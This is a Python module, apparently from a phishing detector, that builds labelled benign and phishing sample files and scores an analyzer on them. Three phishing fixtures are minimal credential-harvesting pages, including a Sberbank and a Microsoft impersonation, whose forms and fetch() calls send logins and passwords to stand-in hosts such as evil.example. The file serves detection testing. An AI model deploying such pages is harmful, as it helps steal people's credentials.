from __future__ import annotations

import json
import math
import time
from dataclasses import dataclass
from pathlib import Path

from .analyzer import Analyzer
from .config import REPORT_DIR
from .models import Verdict
from .utils import atomic_json


@dataclass(slots=True)
class Sample:
    name: str
    label: str
    content: bytes


def builtin_samples() -> list[Sample]:
    benign = [
        Sample("corporate-invoice.eml", "benign", "From: accounting@company.ru\nTo: buyer@company.ru\nSubject: Счет на оплату\nContent-Type: text/plain; charset=utf-8\n\nДобрый день. Счет во вложении, оплатите по договору в обычный срок.".encode()),
        Sample("password-policy.html", "benign", b"<html><body><h1>Password policy</h1><p>Never send your password by email.</p><a href='https://intranet.example.ru/help'>Help</a></body></html>"),
        Sample("newsletter.html", "benign", b"<html><body><p>Microsoft 365 training</p><a href='https://microsoft.com/'>https://microsoft.com/</a><a href='https://mail.vendor.example/news'>News</a></body></html>"),
        Sample("login-demo.html", "benign", b"<html><body><form action='/local'><input type='password' name='demo-password'></form></body></html>"),
        Sample("forwarded.eml", "benign", b"From: sender@example.com\nReply-To: helpdesk@vendor.example\nSubject: Meeting notes\nContent-Type: text/plain\n\nThe notes are attached."),
    ]
    phishing = [
        Sample("unknown-brand-credential.html", "phishing", b"<html><body><h1>Secure portal</h1><form method='post' action='https://collector.bad.example/submit'><input name='login'><input type='password' name='password'></form><script>new FormData(document.forms[0]);fetch('https://collector.bad.example/api',{method:'POST'})</script><a href='https://collector.bad.example'>https://portal.company.example/login</a></body></html>"),
        Sample("sber-fake.html", "phishing", "<html><body><h1>СберБанк</h1><form action='https://sber-login.bad.example/post'><input name='login'><input type='password'></form><script>fetch('https://sber-login.bad.example/post')</script></body></html>".encode()),
        Sample("fake-viewer.html", "phishing", b"<html><body><h1>Microsoft document viewer</h1><p>Open document</p><form action='https://evil.example/auth'><input name='account'><input type='password'></form><script>fetch('https://evil.example/auth')</script></body></html>"),
    ]
    return benign + phishing


def clopper_pearson_zero_upper(n: int, alpha: float = 0.05) -> float | None:
    return 1 - alpha ** (1 / n) if n else None


def run_builtin_benchmark(analyzer: Analyzer | None = None) -> dict:
    analyzer = analyzer or Analyzer()
    rows = []
    started = time.perf_counter()
    for sample in builtin_samples():
        report = analyzer.analyze(sample.content, name=sample.name, network="offline")
        predicted_positive = report.verdict in {Verdict.PHISHING, Verdict.SUSPICIOUS}
        rows.append({"name": sample.name, "label": sample.label, "verdict": report.verdict.value, "analysis_status": report.analysis_status.value, "reason_codes": [e.code for e in report.reason_codes], "correct": predicted_positive == (sample.label == "phishing")})
    benign = [r for r in rows if r["label"] == "benign"]
    phishing = [r for r in rows if r["label"] == "phishing"]
    fp_block = sum(r["verdict"] == "PHISHING" for r in benign)
    fp_review = sum(r["verdict"] == "SUSPICIOUS" for r in benign)
    detected = sum(r["verdict"] in {"PHISHING", "SUSPICIOUS"} for r in phishing)
    blocked = sum(r["verdict"] == "PHISHING" for r in phishing)
    result = {
        "benchmark": "built-in-regression-fixtures",
        "evidence_scope": "synthetic regression only; not an external effectiveness claim",
        "samples": len(rows),
        "confusion": {"phishing_detected": detected, "phishing_missed": len(phishing)-detected, "benign_phishing": fp_block, "benign_suspicious": fp_review, "benign_not_detected": len(benign)-fp_block-fp_review},
        "metrics": {"phishing_plus_suspicious_recall": detected / len(phishing), "phishing_block_recall": blocked / len(phishing), "observed_block_fpr": fp_block / len(benign), "block_fpr_per_million": fp_block / len(benign) * 1_000_000, "zero_fp_95pct_upper_bound": clopper_pearson_zero_upper(len(benign)) if fp_block == 0 else None},
        "rows": rows,
        "duration_ms": round((time.perf_counter()-started)*1000, 2),
    }
    REPORT_DIR.mkdir(parents=True, exist_ok=True)
    atomic_json(REPORT_DIR / "builtin-benchmark.json", result)
    return result

